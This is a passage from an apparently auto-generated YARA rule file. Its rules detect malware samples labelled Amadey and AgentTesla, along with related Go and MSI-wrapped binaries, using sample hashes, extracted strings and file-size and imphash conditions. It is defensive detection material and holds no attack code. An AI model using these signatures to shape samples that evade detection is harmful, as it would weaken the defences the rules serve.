      description = "_subset_batch - from files Amadey(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash).exe, Amadey(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_b0d85015.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0267135d.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_18b46f43.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2b04e503.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2c21a6e8.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_43a642ab.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_62e6ff50.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6bb682e1.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8404211c.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_92d46941.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_abbeb353.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_afaa3664.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d3a1795a.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e26939d8.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f5399d61.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "23bedf93a6f4c8a100c436f0f4acc0da311de886c08e15ec441f2cf60dc3b610"
      hash2 = "b0d85015b59aab6c935e2d871d3819cd3f633688d3988757e124beae2196590c"
      hash3 = "0ca7255d6fb91440cf438533085aadf4927ad3f2fa9383c4e422a733ffb468f9"
      hash4 = "0267135d1f3c49b62b612a1183c05233282a826dc9faba12c6f6cf2daa25db34"
      hash5 = "18b46f4382510716f5659003575e63e62b50a403f4a78570b053e79ee2c07537"
      hash6 = "2b04e503f9a970fab5d3b17ce85559905110524dbc3c23b9fd7668622ec942fe"
      hash7 = "2c21a6e8d8fdb2b7242809b7cdf50036bd910d82e304d5abe0ec0a3e12b56a4e"
      hash8 = "43a642abc27818626bc6eec933a6d4419fb77a38b4d66dc2b05e62b406a2a56b"
      hash9 = "62e6ff50f518e486bc4a0f6cf6be993eae8a62d6e257d4d294460ae30692299c"
      hash10 = "6bb682e11569f217274226cfe7112c52ca3987547139da4709e1d5ba2c97f042"
      hash11 = "8404211cb6e6fea0a3ca73b8ca064a08ff5e7ec9ffa1074298bb21167842bfcd"
      hash12 = "92d46941af85c32946acd03d155eb551c040854d8a99743e45d1368f1b5adb75"
      hash13 = "abbeb353229ead5702c4ee494287564ba6fe2db34f0ccbf1be94f26bdcb7adea"
      hash14 = "afaa3664970437eaa02e3096af3fe7e9c2421212fcdd108d372fd54332692f03"
      hash15 = "d3a1795aea0d082109e759da981507f02836511737b313e9e6bcaaeeecd94fe5"
      hash16 = "e26939d828811c563ec325b50b48e277c9b7b08c6dcc2efc741fe704198e83f9"
      hash17 = "f5399d6162ee4dd9aa4ad0c469b31eb407674ddd1fc518444a78b496ce37521a"
   strings:
      $x1 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x2 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x3 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x4 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x5 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s6 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s7 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
      $s8 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s9 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s10 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s11 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
      $s12 = "WINNSI.DLL" fullword wide /* score: '23.00'*/
      $s13 = "sfxrar.exe" fullword ascii /* score: '22.00'*/
      $s14 = "Cannot create folder %sHChecksum error in the encrypted file %s. Corrupt file or wrong password." fullword wide /* score: '21.00'*/
      $s15 = "D:\\Projects\\WinRAR\\sfx\\build\\sfxrar32\\Release\\sfxrar.pdb" fullword ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _8a7d7cc34c52dce3570005ebd59ab8b0_imphash__9cbefe68f395e67356e2a5d8d1b285c0_imphash__04537b68_9cbefe68f395e67356e2a5d8d1b285_25 {
   meta:
      description = "_subset_batch - from files 8a7d7cc34c52dce3570005ebd59ab8b0(imphash).exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_04537b68.exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_4cfe5a07.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3d16dc942ec08ee48cd4949c939cb0f62d1b21f5e34580691d7632b1748f81b9"
      hash2 = "04537b68ef029a66a16e85052f829b6f6cc969fefe894e0c55f8048cc5ad74a6"
      hash3 = "4cfe5a076f8b5aeedafccaff49969c10d09468bbb795075099f10974248c23f8"
   strings:
      $s1 = "internal/poll.logInitFD" fullword ascii /* score: '19.00'*/
      $s2 = "fmt.complexError" fullword ascii /* score: '17.00'*/
      $s3 = "unicode.Scripts" fullword ascii /* score: '17.00'*/
      $s4 = "internal/syscall/windows.procGetProcessMemoryInfo" fullword ascii /* score: '16.00'*/
      $s5 = "os.commandLineToArgv" fullword ascii /* score: '16.00'*/
      $s6 = "internal/poll/fd_mutex.go" fullword ascii /* score: '15.00'*/
      $s7 = "unicode.IDS_Binary_Operator" fullword ascii /* score: '15.00'*/
      $s8 = "internal/syscall/windows.procNetUserGetLocalGroups" fullword ascii /* score: '14.00'*/
      $s9 = "unicode.Common" fullword ascii /* score: '14.00'*/
      $s10 = "runtime.mapassign_fast64ptr" fullword ascii /* score: '13.00'*/
      $s11 = "unicode.Inscriptional_Parthian" fullword ascii /* score: '13.00'*/
      $s12 = "io.ErrClosedPipe" fullword ascii /* score: '13.00'*/
      $s13 = "unicode.FoldScript" fullword ascii /* score: '13.00'*/
      $s14 = "unicode.Inscriptional_Pahlavi" fullword ascii /* score: '13.00'*/
      $s15 = "unicode.Logical_Order_Exception" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2_8a7d7cc34c52dce3570005ebd59ab8b0_imphash__959833e_26 {
   meta:
      description = "_subset_batch - from files 83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2.elf, 8a7d7cc34c52dce3570005ebd59ab8b0(imphash).exe, 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_04537b68.exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_4cfe5a07.exe, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae"
      hash2 = "3d16dc942ec08ee48cd4949c939cb0f62d1b21f5e34580691d7632b1748f81b9"
      hash3 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash4 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash5 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash6 = "04537b68ef029a66a16e85052f829b6f6cc969fefe894e0c55f8048cc5ad74a6"
      hash7 = "4cfe5a076f8b5aeedafccaff49969c10d09468bbb795075099f10974248c23f8"
      hash8 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash9 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $s1 = "internal/poll.(*fdMutex).rwlock" fullword ascii /* score: '15.00'*/
      $s2 = "internal/poll.(*fdMutex).decref" fullword ascii /* score: '15.00'*/
      $s3 = "internal/poll.(*fdMutex).rwunlock" fullword ascii /* score: '15.00'*/
      $s4 = "internal/poll.(*fdMutex).increfAndClose" fullword ascii /* score: '15.00'*/
      $s5 = "*poll.fdMutex" fullword ascii /* score: '15.00'*/
      $s6 = "internal/poll.(*fdMutex).incref" fullword ascii /* score: '15.00'*/
      $s7 = "reflect.Value.Complex" fullword ascii /* score: '14.00'*/
      $s8 = "runtime.nilinterhash" fullword ascii /* score: '13.00'*/
      $s9 = "runtime.interhash" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.netpollblockcommit" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.expandCgoFrames" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.mapassign_fast64" fullword ascii /* score: '13.00'*/
      $s13 = "sync.(*Pool).Get" fullword ascii /* score: '12.00'*/
      $s14 = "fmt.getField" fullword ascii /* score: '12.00'*/
      $s15 = "internal/fmtsort.compare" fullword ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 21000KB and ( 8 of them )
      ) or ( all of them )
}

rule _83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2_8a7d7cc34c52dce3570005ebd59ab8b0_imphash__27 {
   meta:
      description = "_subset_batch - from files 83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2.elf, 8a7d7cc34c52dce3570005ebd59ab8b0(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae"
      hash2 = "3d16dc942ec08ee48cd4949c939cb0f62d1b21f5e34580691d7632b1748f81b9"
   strings:
      $s1 = "flag.commandLineUsage" fullword ascii /* score: '24.00'*/
      $s2 = "doExecute" fullword ascii /* score: '18.00'*/
      $s3 = "targetpc" fullword ascii /* score: '18.00'*/
      $s4 = "regexp.(*Regexp).doExecute" fullword ascii /* score: '18.00'*/
      $s5 = "os/exec.(*Cmd).Output" fullword ascii /* score: '17.00'*/
      $s6 = "regexp.compileOnePass" fullword ascii /* score: '17.00'*/
      $s7 = "log.(*Logger).Output" fullword ascii /* score: '14.00'*/
      $s8 = "regexp.Compile" fullword ascii /* score: '14.00'*/
      $s9 = "log.(*Logger).Printf" fullword ascii /* score: '14.00'*/
      $s10 = "regexp/syntax.dumpInst" fullword ascii /* score: '14.00'*/
      $s11 = "regexp.compile" fullword ascii /* score: '14.00'*/
      $s12 = "regexp/syntax.dumpProg" fullword ascii /* score: '14.00'*/
      $s13 = "*runtime.traceBufHeader" fullword ascii /* score: '12.00'*/
      $s14 = "flag.UnquoteUsage" fullword ascii /* score: '12.00'*/
      $s15 = "os/exec.(*prefixSuffixSaver).fill" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 21000KB and pe.imphash() == "8a7d7cc34c52dce3570005ebd59ab8b0" and ( 8 of them )
      ) or ( all of them )
}

rule _91f8b1bbcbf11338d823d9d6c8c7e089_imphash__a8e4e1fe33697a4cfe2bb5ea52824f1f_imphash__28 {
   meta:
      description = "_subset_batch - from files 91f8b1bbcbf11338d823d9d6c8c7e089(imphash).exe, a8e4e1fe33697a4cfe2bb5ea52824f1f(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "403e0c40a6eca112766379d8d1dd31dde3919d992f9f78b41f0e08fba440b4f5"
      hash2 = "f4808c0897d5c53642bef6410662f9ad5b9ac39bb4b54b24581221bd52101fe2"
   strings:
      $s1 = "Content-Disposition: %s%s%s%s%s%s%s" fullword ascii /* score: '16.00'*/
      $s2 = "Content-Type: %s%s%s" fullword ascii /* score: '16.00'*/
      $s3 = "SOCKS4%s: connecting to HTTP proxy %s port %d" fullword ascii /* score: '15.50'*/
      $s4 = "getaddrinfo() thread failed to start" fullword ascii /* score: '15.00'*/
      $s5 = "No valid port number in connect to host string (%s)" fullword ascii /* score: '15.00'*/
      $s6 = "Connection closure while negotiating auth (HTTP 1.0?)" fullword ascii /* score: '13.00'*/
      $s7 = "Unsupported proxy '%s', libcurl is built without the HTTPS-proxy support." fullword ascii /* score: '13.00'*/
      $s8 = "SOCKS5: connecting to HTTP proxy %s port %d" fullword ascii /* score: '13.00'*/
      $s9 = "oversized cookie dropped, name/val %zu + %zu bytes" fullword ascii /* score: '13.00'*/
      $s10 = "Unsupported proxy scheme for '%s'" fullword ascii /* score: '13.00'*/
      $s11 = "Unrecognized content encoding type. libcurl understands %s content encodings." fullword ascii /* score: '12.00'*/
      $s12 = "TFTP error: %s" fullword ascii /* score: '12.00'*/
      $s13 = "operation aborted by trailing headers callback" fullword ascii /* score: '12.00'*/
      $s14 = "Invalid Content-Length: value" fullword ascii /* score: '11.00'*/
      $s15 = "Ignoring Content-Length in CONNECT %03d response" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _9cbefe68f395e67356e2a5d8d1b285c0_imphash__04537b68_9cbefe68f395e67356e2a5d8d1b285c0_imphash__4cfe5a07_29 {
   meta:
      description = "_subset_batch - from files 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_04537b68.exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_4cfe5a07.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "04537b68ef029a66a16e85052f829b6f6cc969fefe894e0c55f8048cc5ad74a6"
      hash2 = "4cfe5a076f8b5aeedafccaff49969c10d09468bbb795075099f10974248c23f8"
   strings:
      $x1 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii /* score: '58.00'*/
      $x2 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '54.00'*/
      $x3 = "<asmv3:application xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/" ascii /* score: '48.00'*/
      $x4 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryUnable to determine " ascii /* score: '47.00'*/
      $x5 = "object is remotereflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=runtime: head = " ascii /* score: '46.00'*/
      $x6 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '44.50'*/
      $x7 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '44.00'*/
      $x8 = "152587890625762939453125Bidi_ControlErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_Con" ascii /* score: '44.00'*/
      $x9 = " to non-Go memory , locked to thread298023223876953125Arab Standard TimeCaucasian_AlbanianCommandLineToArgvWCreateFileMappingWCu" ascii /* score: '42.00'*/
      $x10 = "unknown pcws2_32.dll  of size   (targetpc= , plugin:  KiB work,  exp.) for  freeindex= gcwaiting= idleprocs= in status  mallocin" ascii /* score: '42.00'*/
      $x11 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '38.00'*/
      $x12 = "entersyscallgcBitsArenasgcpacertraceharddecommithost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdont" ascii /* score: '36.00'*/
      $x13 = "structure needs cleaningupdate during transitionzlib: invalid dictionary bytes failed with errno= to unused region of span291038" ascii /* score: '35.00'*/
      $x14 = " lockedg= lockedm= m->curg= marked   ms cpu,  not in [ runtime= s.limit= s.state= threads= unmarked wbuf1.n= wbuf2.n=(unknown), " ascii /* score: '32.00'*/
      $x15 = "476837158203125<invalid Value>ASCII_Hex_DigitCreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed to load FlushVie" ascii /* score: '32.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _9f13ff638f16e84114b264217948c7d199e4acd103d8f4ecbc2930431accc5f2_9f13ff63_af143b79a29e51366964416da4b3a30b26def93d52b67a6ad_30 {
   meta:
      description = "_subset_batch - from files 9f13ff638f16e84114b264217948c7d199e4acd103d8f4ecbc2930431accc5f2_9f13ff63.msi, af143b79a29e51366964416da4b3a30b26def93d52b67a6ad6e9528935bf4a62_af143b79.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9f13ff638f16e84114b264217948c7d199e4acd103d8f4ecbc2930431accc5f2"
      hash2 = "af143b79a29e51366964416da4b3a30b26def93d52b67a6ad6e9528935bf4a62"
   strings:
      $x1 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii /* score: '31.00'*/
      $s2 = " - UNREGISTERED - Wrapped using MSI Wrapper from www.exemsi.com" fullword wide /* score: '26.00'*/
      $s3 = "MsiCustomActions.dll" fullword ascii /* score: '23.00'*/
      $s4 = "C:\\ss2\\Projects\\MsiWrapper\\MsiCustomActions\\Release\\MsiCustomActions.pdb" fullword ascii /* score: '22.00'*/
      $s5 = "Error removing temp executable." fullword wide /* score: '22.00'*/
      $s6 = "EXPAND.EXE" fullword wide /* score: '22.00'*/
      $s7 = " format.InstallExecuteSequenceInstallUISequenceLaunchConditionExpression which must evaluate to TRUE in order for install to com" ascii /* score: '21.00'*/
      $s8 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii /* score: '20.00'*/
      $s9 = "OS supports elevation" fullword wide /* score: '19.00'*/
      $s10 = "OS does not support elevation" fullword wide /* score: '19.00'*/
      $s11 = "ack cabinet order.IconPrimary key. Name of the icon file.Binary stream. The binary icon data in PE (.DLL or .EXE) or icon (.ICO)" ascii /* score: '18.00'*/
      $s12 = "Execute view" fullword wide /* score: '18.00'*/
      $s13 = "ICACLS.EXE" fullword wide /* score: '18.00'*/
      $s14 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii /* score: '17.00'*/
      $s15 = "Error in call to MsiViewExecute" fullword wide /* score: '17.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 25000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _837fe6c9e243ff99b6590b36278aa82c_imphash__AgentTesla_signature__6d242744_31 {
   meta:
      description = "_subset_batch - from files 837fe6c9e243ff99b6590b36278aa82c(imphash).exe, AgentTesla(signature)_6d242744.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "da061f2bdb2a6d84d3e7d6b2045834655fe65418e9ad7281b4b689a3700dc003"
      hash2 = "6d242744cbee7249a48505d1447d984e9c912b904be4ea3dcccd07602ef5264d"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                            ' */ /* score: '26.50'*/
      $s2 = "MgwhWq8r40QKbI.dll" fullword ascii /* score: '23.00'*/
      $s3 = "C:\\WINDOWS\\b9f0fa9f94b794a08cde542f19afda04\\lt\\ArcSetup\\WPF\\81D109E8\\Public\\2.pdb" fullword ascii /* score: '22.00'*/
      $s4 = "Hdb9O6qKh4hAO7hB83iWTdIVpaFr6yb8V.dll{" fullword ascii /* score: '19.00'*/
      $s5 = "@System.Security.Cryptography.dll@db9O6qKh4hAO7hB83iWTdIVpaFr6yb8V" fullword ascii /* score: '19.00'*/
      $s6 = "TehuantepecanCentralizing.exe" fullword wide /* score: '18.00'*/
      $s7 = "*&ReflectionExecution' " fullword ascii /* score: '16.00'*/
      $s8 = "3s!*ProcessorArchitecture&AssemblyContentType\"AssemblyNameFlags" fullword ascii /* score: '16.00'*/
      $s9 = "Uo NtProcessManager" fullword ascii /* score: '15.00'*/
      $s10 = "JLI_PreprocessArg" fullword ascii /* score: '15.00'*/
      $s11 = "ProcessManagerw" fullword ascii /* score: '15.00'*/
      $s12 = "JLI_InitArgProcessing" fullword ascii /* score: '15.00'*/
      $s13 = "Types with embedded references are not supported in this version of your compiler.;A" fullword ascii /* score: '13.00'*/
      $s14 = "Uo TypeBuilderState*TypeLoaderEnvironment+" fullword ascii /* score: '13.00'*/
      $s15 = "Uo8IStateMachineBoxAwareAwaiter&DllImportSearchPath" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x7061 ) and filesize < 9000KB and pe.imphash() == "837fe6c9e243ff99b6590b36278aa82c" and ( 8 of them )
      ) or ( all of them )
}

rule _837fe6c9e243ff99b6590b36278aa82c_imphash__AgentTesla_signature__1ff43e683b799b78959121aacb9f0786_imphash__AgentTesla_signat_32 {
   meta:
      description = "_subset_batch - from files 837fe6c9e243ff99b6590b36278aa82c(imphash).exe, AgentTesla(signature)_1ff43e683b799b78959121aacb9f0786(imphash).exe, AgentTesla(signature)_1ff43e683b799b78959121aacb9f0786(imphash)_ea39e8b7.exe, AgentTesla(signature)_6d242744.tar, AgentTesla(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, AgentTesla(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "da061f2bdb2a6d84d3e7d6b2045834655fe65418e9ad7281b4b689a3700dc003"
      hash2 = "0d96551046ad9c205cabca0aa816b062a85a9cf3716486d74ae73976db00dd11"
      hash3 = "ea39e8b7e3c1b9f60c4702870811029c644fc6c16a09e9528031160ff0445f92"
      hash4 = "6d242744cbee7249a48505d1447d984e9c912b904be4ea3dcccd07602ef5264d"
      hash5 = "7b3d435d322d7303446c5ce3308704a1d4d5a5b1e70abb44a19502be6baf2c79"
      hash6 = "239ec64b8c00bdc8603baaf441fc33bb14c14800051cf2d48d80345ff2966d9a"
   strings:
      $s1 = "System.ComponentModel.Design.IDesignerHost.IsSupported" fullword ascii /* score: '25.00'*/
      $s2 = "Description: The process was terminated due to an internal error in the .NET Runtime" fullword wide /* score: '24.00'*/
      $s3 = "System.ComponentModel.TypeDescriptor.IsComObjectDescriptorSupported" fullword ascii /* score: '23.00'*/
      $s4 = "System.ComponentModel.DefaultValueAttribute.IsSupported" fullword ascii /* score: '20.00'*/
      $s5 = "icu.dll" fullword wide /* score: '20.00'*/
      $s6 = "Description: The process was terminated due to an unhandled exception" fullword wide /* score: '18.00'*/
      $s7 = "System.GC.DTargetTCP" fullword ascii /* score: '17.00'*/
      $s8 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '17.00'*/
      $s9 = "RtlGetReturnAddressHijackTarget" fullword ascii /* score: '17.00'*/
      $s10 = "TargetDetails4ExceptionTypeNameFormatter\"TypeNameFormatter6RuntimeGenericParameterDesc" fullword ascii /* score: '17.00'*/
      $s11 = "Description: The application requested process termination through System.Environment.FailFast" fullword wide /* score: '17.00'*/
      $s12 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '16.00'*/
      $s13 = "DExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s14 = "peForTargetTypeNTryGetByRefTypeForTargetType_LookupOnly(GetCanonicalHashCode@" fullword ascii /* score: '16.00'*/
      $s15 = "(ExecutionEnvironment" fullword ascii /* score: '16.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x7061 ) and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _9cbefe68f395e67356e2a5d8d1b285c0_imphash__9cbefe68f395e67356e2a5d8d1b285c0_imphash__04537b68_9cbefe68f395e67356e2a5d8d1b285_33 {
   meta:
      description = "_subset_batch - from files 9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_04537b68.exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_4cfe5a07.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1005065810ae3c06e48ea42e790775bd003451a8aea76a25331cbe9a55f701f2"
      hash2 = "04537b68ef029a66a16e85052f829b6f6cc969fefe894e0c55f8048cc5ad74a6"
      hash3 = "4cfe5a076f8b5aeedafccaff49969c10d09468bbb795075099f10974248c23f8"
   strings:
      $s1 = "unknown pcws2_32.dll  of size   (targetpc= , plugin:  KiB work,  exp.) for  freeindex= gcwaiting= idleprocs= in status  mallocin" ascii /* score: '21.00'*/
      $s2 = "rof.dll" fullword ascii /* score: '20.00'*/
      $s3 = "e nmspinninginvalid runtime symbol tablemheap.freeSpanLocked - span missing stack in shrinkstackmspan.sweep: m is not lockednewp" ascii /* score: '20.00'*/
      $s4 = "runtime: bad pointer in frame runtime: found in object at *(runtime: impossible type kind socket operation on non-socketsync: in" ascii /* score: '18.00'*/
      $s5 = "runtime.getlasterror.abi0" fullword ascii /* score: '18.00'*/
      $s6 = "object is remotereflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=runtime: head = " ascii /* score: '18.00'*/
      $s7 = "entersyscallgcBitsArenasgcpacertraceharddecommithost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdont" ascii /* score: '17.00'*/
      $s8 = "runtime.buildVersion.str" fullword ascii /* score: '16.00'*/
      $s9 = "runtime.makeHeadTailIndex" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.overrideWrite" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.levelLogPages" fullword ascii /* score: '15.00'*/
      $s12 = "runtime._RtlGetNtVersionNumbers" fullword ascii /* score: '15.00'*/
      $s13 = "runtime: bad pointer in frame runtime: found in object at *(runtime: impossible type kind socket operation on non-socketsync: in" ascii /* score: '15.00'*/
      $s14 = "runtime.data" fullword ascii /* score: '14.00'*/
      $s15 = "runtime.systemstack_switch.abi0" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__45da2c06_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_34 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_45da2c06.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4c366461.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8997370d.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ad43d09b.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f3026acc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "45da2c06168b05d8b841a107f57566701426ee5923785c922d6c52f18e019437"
      hash2 = "4c36646137b8796ce102bf27296af58ca6cb8e5c5bce41a45fee3ec89fc99d2c"
      hash3 = "8997370d9ed8cad88c1c69ffa39d35ddca8578371b5fe96da08e850308c9d623"
      hash4 = "ad43d09bcce26ca1b2c6e5a6ee96fcbb07f7105126a2d07af6289576a7f6feaa"
      hash5 = "f3026acc73c9537b343f2aec9eda1b51ce1eb304a15fcbdb95d88a291c2c248c"
   strings:
      $s1 = "Event Log Analysis Report - " fullword wide /* score: '20.00'*/
      $s2 = "EventLog_Analysis_{0}_{1:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '19.00'*/
      $s3 = "Error getting statistics for event log '" fullword wide /* score: '17.00'*/
      $s4 = "Error getting available event logs: " fullword wide /* score: '17.00'*/
      $s5 = "Error getting entry count for event log '" fullword wide /* score: '17.00'*/
      $s6 = "Event Log Analyzer - v1.0" fullword wide /* score: '17.00'*/
      $s7 = "labelLogInfo" fullword wide /* score: '15.00'*/
